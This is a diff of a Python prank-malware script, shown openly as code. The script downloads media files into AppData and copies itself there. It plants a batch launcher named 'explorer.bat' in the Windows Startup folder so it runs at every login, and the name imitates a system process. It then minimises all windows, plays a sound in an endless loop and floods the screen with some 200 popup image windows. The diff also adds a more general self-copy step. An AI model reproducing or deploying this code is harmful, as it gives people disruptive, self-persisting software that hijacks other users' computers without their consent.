@@ -44,7 +44,6 @@ while True:
 
 
         # FUNCTIONS
-
         def DownloadFiles():
             if("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" in os.getcwd()):
                 0+0
@@ -58,7 +57,6 @@ while True:
                     with open('./lmao.mp3', 'wb') as f:
                         f.write(r.content)
                     shutil.move('./lmao.mp3', AppDataPath)
-                    #os.remove(AppDataPath + ".\\lmao.mp3")
 
                 if(path.exists(AppDataPath + "/lmao.png")):
                     0+0
@@ -67,7 +65,6 @@ while True:
                     with open('./lmao.png', 'wb') as f:
                         f.write(r.content)            
                     shutil.move('./lmao.png', AppDataPath)
-                    #os.remove(AppDataPath + ".\\lmao.png")
 
 
                 if(path.exists(AppDataPath + "/lmao2.png")):
@@ -77,20 +74,13 @@ while True:
                     with open('./lmao2.png', 'wb') as f:
                         f.write(r.content)            
                     shutil.move('./lmao2.png', AppDataPath)
-                
-
-                #shutil.move('.\\lmao.mp3', AppDataPath)
-                #shutil.move('.\\lmao.png', AppDataPath)
 
 
         def PlaySound():
             pathtoaudio = AppDataPath + "/lmao.mp3"
-            while True:
-                #print("lmao")
-                #time.sleep(0.1)            
+            while True:          
                 playsound(pathtoaudio, block=False)
                 time.sleep(230)
-                #print("lmao2")
                 
                     
 
@@ -106,11 +96,10 @@ while True:
                 batData = """@echo off
 {}
 cd "{}"
-python lmfao.py
+python {}
 pause
-""".format(minData, AppDataPath)
-                #shutil.copy(sys.argv[0], StartupPath)
-                shutil.copy(sys.argv[0], AppDataPath)
+""".format(minData, AppDataPath, os.path.basename(__file__))
+                shutil.copyfile(sys.argv[0], AppDataPath + "/{}".format(os.path.basename(__file__)))
                 with open(StartupPath + "\\explorer.bat", "w") as f:
                     f.writelines(batData)
                     f.close
@@ -121,9 +110,6 @@ pause
                 minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }"""
                 os.system(minData)
                 time.sleep(5)
-                #minData = """powershell -command "& { $x = New-Object -ComObject Shell.Application; $x.maximizeall() }"""
-                #os.system(minData)
-                #time.sleep(5)
 
 
 
@@ -159,31 +145,17 @@ pause
                     window.resizable(False, False)            
                     canvas = Canvas(window, width = 1000, height = 300)
                     canvas.pack()
-                    my_image = images[randrange(len(images) - 1)]  #PhotoImage(file=(AppDataPath + "\\lmao.png"))
-                    #my_image.width = 10000
+                    my_image = images[randrange(len(images) - 1)]
                     canvas.create_image(0, 0, anchor = NW, image=my_image)
                     for x in range(200):
                         indeximg = randrange(len(images))
-                        
-
                         img = imagePaths[indeximg] 
-  
-                        # get width and height
                         width = img.width
                         height = img.height
-                        
-                        # display width and height
-                        #print("The height of the image is: ", height)
-                        #print("The width of the image is: ", width)
-                        #print(indeximg)
                         my_image = images[indeximg]                        
-                        nw = Toplevel(window)
-                        # get screen width and height
-                        
+                        nw = Toplevel(window)                        
                         w = width
                         h = height
-                        #print(int(w))
-                        #print(h)
 
                         # calculate x and y coordinates for the Tk root window
                         x = randrange(1281)
@@ -210,5 +182,3 @@ pause
         print(EX)
         with open("loglmao.txt", "w") as f:
             f.writelines(str(EX))
-
-
